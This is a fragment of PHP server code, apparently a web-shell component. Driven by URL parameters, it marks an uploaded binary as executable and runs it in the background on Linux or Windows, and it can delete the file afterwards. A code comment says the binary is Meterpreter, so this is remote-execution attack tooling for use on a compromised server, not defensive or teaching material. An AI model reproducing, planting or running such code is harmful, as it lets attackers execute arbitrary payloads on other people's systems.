...
if(!empty($_GET)){
	...
	if(isset($_GET["file"])){	//if url variable file is received
		//Session is created to hold the filename etc.
		if(session_start() === false){exit("[Server] Couldnt Start Session");}
		//Report all errors
		error_reporting(E_ALL); 
		ini_set( 'display_errors','1');
		...
		if(isset($_GET["run"])){				//if url var run is received: execute uploaded binary
		/*
		 * In php different ways to execute in linux and windows
		 */ 
			if (stristr(PHP_OS, "linux")){		
				exec("chmod +x " . $_SESSION['file']);			//if linux: need to make it an executable first
				exec($_SESSION['file'] . " > /dev/null &");		//Execute meterpreter
				echo "[Server] Run";							//Reply back
			}
			else{	#Windows
				pclose(popen("start /B ". $_SESSION['file'], "r"));	//Execute in windows
				echo "[Server] Run";
			}
		}
		if(isset($_GET["delete"])){	//if url var delete is received: delete file
			if(unlink($_SESSION['file'])){	
				echo "[Server] File Deleted";
			}
			else{
				exit("[Server] Can't delete file");
			}
		}
	}
}
